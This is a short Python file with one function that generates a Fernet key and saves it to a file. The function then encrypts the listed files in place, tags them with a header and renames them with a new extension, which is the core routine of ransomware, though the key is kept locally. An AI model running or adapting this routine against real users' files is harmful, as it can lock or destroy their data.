import os
from cryptography.fernet import Fernet

def encryption(files, KEY_FILE, EXTENSION):
    HEADER = b'encrypted::'

    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as theKey:
        theKey.write(key)

    for file in files:
        if file.endswith(EXTENSION):
            continue
        else:                
            with open(file, "rb") as thefile:
                contents = thefile.read()
                
            if contents.startswith(HEADER):
                continue
            
            encrypted_content = HEADER + Fernet(key).encrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(encrypted_content)
            
            new_file_path = file + EXTENSION
            # Check if the new file path already exists
            if not os.path.exists(new_file_path):            
                os.rename(file, new_file_path)

